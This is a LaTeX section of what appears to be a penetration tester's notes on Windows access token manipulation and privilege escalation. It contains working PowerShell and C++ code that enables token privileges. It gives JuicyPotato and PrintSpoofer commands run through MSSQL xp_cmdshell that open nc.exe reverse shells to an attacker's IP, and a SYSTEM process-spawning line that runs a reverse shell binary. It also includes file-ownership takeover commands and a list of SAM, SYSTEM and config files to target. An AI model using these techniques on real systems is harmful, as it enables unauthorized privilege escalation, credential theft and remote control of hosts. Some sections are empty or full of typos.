\section{Access Token Manipulation (T1134)}

\href{https://www.exploit-db.com/exploits/13054}{Reference article}

\begin{itemize}
    \item \href{https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b}{Understanding and Defending Against Access Token Theft: Finding Alternatives to winlogon.exe}
    \item \href{https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation}{Primary Access Token Manipulation}
\end{itemize}

\begin{itemize}
    \item token impersonation / theft
    \item create process with token
    \item make and impersonate token
    \item parent PID spoofing
    \item SID-History injection
\end{itemize}

\subsection{Adjusting token privileges}
When trying to run a command without a privilege enabled, usually  an ‘Access is Denied’ error is raiser. This can be because the privilege need to be enable before doing.  


\subsubsection{In powershell}

To enable priviledges, it is possible to use this
\href{https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1}{script}
which is detailed in this
\href{https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/}{blog
post}, as well as
\href{https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77}{this
one} which builds on the initial concept.

PowerShell doesn’t ship a cmdlet to adjust token privileges by default, but Add-Type makes it very reasonable. Here is Set-TokenPrivilege.ps1 in all its glory:


\begin{verbatim}
param(    ## The privilege to adjust. This set is taken from
    ## http://msdn.microsoft.com/en-us/library/bb530716(VS.85).aspx

    [ValidateSet(
        "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege",
"SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
"SeCreatePagefilePrivilege","SeCreatePermanentPrivilege",
"SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege",
"SeEnableDelegationPrivilege", "SeImpersonatePrivilege",
"SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
"SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
"SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
"SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
"SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
"SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
"SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
"SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege",
"SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege",
"SeUnsolicitedInputPrivilege")]
    $Privilege,

    ## The process on which to adjust the privilege.
    ## Defaults to the current process.
    $ProcessId = $pid,

    ## Switch to disable the privilege, rather than enable it.
    [Switch] $Disable
)

## Taken from P/Invoke.NET with minor adjustments.
$definition = @'
using System;

using System.Runtime.InteropServices;
public class AdjPriv
{
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, 
        ref IntPtr phtok);

    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, 
        string name, ref long pluid);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }

    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

    public static bool EnablePrivilege(long processHandle, 
        string privilege, bool disable)
    {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = new IntPtr(processHandle);
        IntPtr htok = IntPtr.Zero;
        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES |
            TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;

        if(disable)
        {
            tp.Attr = SE_PRIVILEGE_DISABLED;
        }
        else
        {
            tp.Attr = SE_PRIVILEGE_ENABLED;
        }

        retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
        retVal = AdjustTokenPrivileges(htok, false, ref tp, 0,
            IntPtr.Zero, IntPtr.Zero);
        return retVal;
    }
}
'@

$processHandle = (Get-Process -id $ProcessId).Handle
$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege($processHandle, $Privilege, $Disable)
\end{verbatim}


Another method:
\begin{verbatim}
Function Enable-Privilege {
    <#
        .SYNOPSIS
            Enables specific privilege or privileges on the current process.

        .DESCRIPTION
            Enables specific privilege or privileges on the current process.
        
        .PARAMETER Privilege
            Specific privilege/s to enable on the current process
        
        .NOTES
            Name: Enable-Privilege
            Author: Boe Prox
            Version History:
                1.0 - Initial Version

        .EXAMPLE
        Enable-Privilege -Privilege SeBackupPrivilege

        Description
        -----------
        Enables the SeBackupPrivilege on the existing process

        .EXAMPLE
        Enable-Privilege -Privilege SeBackupPrivilege, 
            SeRestorePrivilege, SeTakeOwnershipPrivilege

        Description
        -----------
        Enables the SeBackupPrivilege, 
            SeRestorePrivilege and SeTakeOwnershipPrivilege on the existing process
        
    #>
    [cmdletbinding(
        SupportsShouldProcess = $True
    )]
    Param (
        [parameter(Mandatory = $True)]
        [Privileges[]]$Privilege
    )    
    If ($PSCmdlet.ShouldProcess("Process ID: $PID", 
            "Enable Privilege(s): $($Privilege -join ', ')")) {
        #region Constants
        $SE_PRIVILEGE_ENABLED = 0x00000002
        $SE_PRIVILEGE_DISABLED = 0x00000000
        $TOKEN_QUERY = 0x00000008
        $TOKEN_ADJUST_PRIVILEGES = 0x00000020
        #endregion Constants

        $TokenPriv = New-Object TokPriv1Luid
        $HandleToken = [intptr]::Zero
        $TokenPriv.Count = 1
        $TokenPriv.Attr = $SE_PRIVILEGE_ENABLED
    
        #Open the process token
        $Return = [PoshPrivilege]::OpenProcessToken(
            [PoshPrivilege]::GetCurrentProcess(),
            ($TOKEN_QUERY -BOR $TOKEN_ADJUST_PRIVILEGES), 
            [ref]$HandleToken
        )    
        If (-NOT $Return) {
            Write-Warning "Unable to open process token! Aborting!"
            Break
        }
        ForEach ($Priv in $Privilege) {
            $PrivValue = $Null
            $TokenPriv.Luid = 0
            #Lookup privilege value
            $Return = [PoshPrivilege]::LookupPrivilegeValue($Null, 
                    $Priv, [ref]$PrivValue)             
            If ($Return) {
                $TokenPriv.Luid = $PrivValue
                #Adjust the process privilege value
                $return = [PoshPrivilege]::AdjustTokenPrivileges(
                    $HandleToken, 
                    $False, 
                    [ref]$TokenPriv, 
                    [System.Runtime.InteropServices.Marshal]::SizeOf($TokenPriv), 
                    [IntPtr]::Zero, 
                    [IntPtr]::Zero
                )
                If (-NOT $Return) {
                    Write-Warning "Unable to enable privilege <$priv>! "
                }
            }
        }
    }
}
\end{verbatim}

\subsubsection{In cpp}
\begin{verbatim}
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | 
        TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	system("cmd");
    return 0;
}
\end{verbatim}

\subsection{Abusing Tokens}

\subsubsection{SeImpersonate and SeAssignPrimaryToken}
Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space.

Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

The seImpersonate privilege is usually obtained after gaining remote code
execution via an application that runs in the context of a service account (for
example, uploading a web shell to an ASP.NET web application, achieving remote
code execution through a Jenkins installation, or by executing commands through
MSSQL queries). Whenever an access is gained in this way, privileges should
immediately be checked as its presence often offers a quick and easy route to
elevated privileges. 

Further details on
\href{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}{token impersonation attacks}.

{\bf Juicy Potato}:

JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.

Does this still works?

Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.


From a MSSQL server with \verb+xp_cmdshell+
\begin{enumerate}
    \item upload \verb+juicyporato.exe+ and \verb+nc.exe+
    \item start a listener on attacker
    \item launch
\begin{verbatim}
xp_cmdshell JuicyPotato.exe -l 53375 -p \c:\windows\system32\cmd.exe -a "/c
c:\tools\nc.exe IP PORT -e cmd.exe" -t * -c "{CLSID}" 
\end{verbatim}
\end{enumerate}

for more information:
\begin{itemize}
    \item 
        \href{https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato}{juicyPotato}
    \item \href{https://ohpe.it/juicy-potato/CLSID/}{CLSID}
\end{itemize}


{\bf GodPotato}:

{\bf SharpEfsPotato}:

{\bf Rogue potato}:

{\bf PrintSpoofer}:

\href{https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/}{PrintSpoofer}
can be used to abuse impersonation privileges on Windows 10 and Server 2019
hosts where JuicyPotato no longer works.

the tool ican spawn a SYSTEM process in the current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell

Case of reverse shell with MSSQL \verb+xp_cmdshell+

\begin{verbatim}
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  IP PORT -e cmd"
\end{verbatim}

{\bf RogueWinRM}:

\href{https://github.com/antonioCoco/RogueWinRM}{RogueWinRM} is a local
privilege escalation exploit that allows to escalate from a Service account
(with SeImpersonatePrivilege) to Local System account if WinRM service is not
running (default on Win10 but NOT on Windows Server 2019).

Briefly, it will listen for incoming connection on port 5985 faking a real
WinRM service.

It's just a minimal webserver that will try to negotiate an NTLM authentication
with any service that are trying to connect on that port.

Then the BITS service (running as Local System) is triggered and it will try to
authenticate to our rogue listener. Once authenticated to our rogue listener,
we are able to impersonate the Local System user spawning an arbitrary process
with those privileges.

You can find a full technical description of this vulnerability at this 
\href{https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/}{article}



\subsubsection{SeDebug}
This privilege allow to dump process memory. Therefor it can be used to perform
attacks like dumping lsass.


{\bf RCE as system}:
\begin{verbatim}
.\psgetsys.ps1; 
    [MyProcess]::CreateProcessFromParent("<winlogon_pid>",
        "c:\windows\system32\cmd.exe", "/c c:\tools\revshell.exe")
\end{verbatim}

\subsubsection{SeTakeOwnership}

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any
\emph{securable object} meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. 
\begin{verbatim}
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | 
Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={
    (Get-Acl $_.FullName).Owner }}
\end{verbatim}


\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown}{takeown}
Windows binary to change ownership of the file and \verb+icacals+ 
\begin{verbatim}
takeown /f FILE_PATH
icacls FILE_PATH /grant SAMAN:F
\end{verbatim}

Files of Interest
\begin{itemize}
\item \verb+c:\inetpub\wwwwroot\web.config+
\item \verb+%WINDIR%\repair\sam+
\item \verb+%WINDIR%\repair\system+
\item \verb+%WINDIR%\repair\software, %WINDIR%\repair\security+
\item \verb+%WINDIR%\system32\config\SecEvent.Evt+
\item \verb+%WINDIR%\system32\config\default.sav+
\item \verb+%WINDIR%\system32\config\security.sav+
\item \verb+%WINDIR%\system32\config\software.sav+
\item \verb+%WINDIR%\system32\config\system.sav+
\end{itemize}

\subsubsection{seBackup}
{\bf Reading any file}:

\href{https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges}{SeBackupPrivilege}
allows to traverse any folder and list the folder contents. It allow tp copy a
file from a folder, even if there is no access control entry (ACE) for the user
in the folder's access control list (ACL). this has to be done with the use of
a \href{https://github.com/giuliano108/SeBackupPrivilege}{programmatically data
copy} (\verb+Import-Module .\SeBackupPrivilegeUtils.dll ;Import-Module .\SeBackupPrivilegeCmdLets.dll+, using  the
\href{https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea}{FILE\_FLAG\_BACKUP\_SEMANTICS} flag.

{\bf Credential Access}:

This privilege enable NTDS.dit copying~\ref{mitre:t1003.003} and SAM dumping\ref{mitre:t1003.002} 


{\bf Copying files with Robocopy}:

The built-in utility\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy}{robocopy} can be used to copy files in backup mode as well.

Robocopy is a command-line directory replication tool. It can be used to create
backup jobs and includes features such as multi-threaded copying, automatic
retry, the ability to resume copying, and more. Robocopy differs from the copy
command in that instead of just copying all files. It can check the destination
directory and remove files no longer in the source directory. It can also
compare files before copying to save time by not copying files that have not
been changed since the last copy/backup job ran.

\subsubsection{SeTcbPrivilege}

If you have enabled this token you can use \verb+KERB_S4U_LOGON+ to get an impersonation token for any other user without knowing the credentials, add an arbitrary group (admins) to the token, set the integrity level of the token to "medium", and assign this token to the current thread (SetThreadToken).


\subsection{links}
\begin{itemize}
    \item \url{https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa}
    \item \url{https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962}
    \item \url{https://jlajara.gitlab.io/Potatoes_Windows_Privesc}
    \item \url{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}
    \item 
    \item \url{https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation}
    \item \url{https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1}
\end{itemize}
